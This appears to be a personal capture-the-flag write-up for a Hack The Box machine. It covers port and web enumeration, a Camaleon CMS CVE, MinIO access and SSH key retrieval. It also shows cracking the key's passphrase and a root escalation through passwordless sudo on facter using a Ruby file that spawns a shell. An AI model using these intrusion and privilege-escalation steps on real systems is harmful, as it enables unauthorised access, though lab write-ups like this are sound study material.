---
tags:
banner:
publish: false
---
# Service enumeration
```
nmap -p- -sV --script=banner 10.129.2.196
```
![[Vault-data/Attachments/Weekly box - Facts (Easy).png]]

More in depth info:
```bash
nmap -p- -sC -sV 10.129.2.196
```
Optionally, add `-T4` (1-5, default=3) to speed things up, but you might miss something due to connection stability shenanigans.

Banner grabbing info:
https://nmap.org/nsedoc/scripts/banner.html
https://en.wikipedia.org/wiki/Banner_grabbing

## port 22/tcp
openSSH 9.9p1 Ubuntu 3ubuntu3.2
## port 80/tc
nginx V 1.26.3 (ubuntu)
## port 54321/tcp
Golang server

MinIo: blob storage database with api capabilities. Runs on [Amazon S3](https://en.wikipedia.org/wiki/Amazon_S3)

https://en.wikipedia.org/wiki/MinIO

Minio has a CLI client, `mc`.

# Web enumeration

## Directories
[Gobuster](https://en.wikipedia.org/wiki/MinIO)

```bash
gobuster dir --url http://facts.htb --wordlist /usr/share/wordlists/dirb/common.txt
```

use `--timeout 20s` or/and `--retry true` (or a higher timeout value) if a timeout occurs due to htb being slow as shit

admin page found: `http://facts.htb/admin`

you could redo enumeration of these things if you had admin credentials

### Admin login page
https://www.kali.org/tools/burpsuite/

Attempted attack method: [parameter tampering](https://owasp.org/www-community/attacks/Web_Parameter_Tampering#)

Website is made by camaleon cms V 2.9.0 (jan 6, 2025)

Vulnerable to `CVE-2025-2304` [exploit poc](https://github.com/whiteov3rflow/CVE-2025-2304-POC?tab=readme-ov-file)

### Admin page
Plugin page?

Media page has an upload file place, can upload anything

Mineo access and secret key present


## Dns subdomain
dns subdomain enumeration
https://github.com/ffuf/ffuf
```bash
ffuf -w /usr/share/wordlists/wfuzz/general/medium.txt -u http://IP -H "HOST: FUZZ.boxname.htb" -fs 154
```


## Minio
access granted via admin page credentials

ssh private key granted trough `mc ls bucket/internal/.ssh/id_ed2347462378678236783 something`.

copy contents to local private key file in ssh folder.

`ssh2john minio > minio.hash`
passphrase: `dragonballz`.

```
ssh-keygen -p -f minio
```
user: `trivia`
`ssh trivia@ip -i minio`

# root flag
ubuntu 25.04
sudo version 1.9.16p2

user info:
- trivia
- x 
- 1000 → user id
- 1000 → group id’

[facter](https://github.com/puppetlabs/facter) 4.10.0 has nopasswd root privileges

run custom config directory:
```bash
mkdir ~/custom
cd ~/custom
echo "exec '/bin/sh'" >> escalation.rb
facter --custom-dir ~/custom
```

`cd /root`
yippie




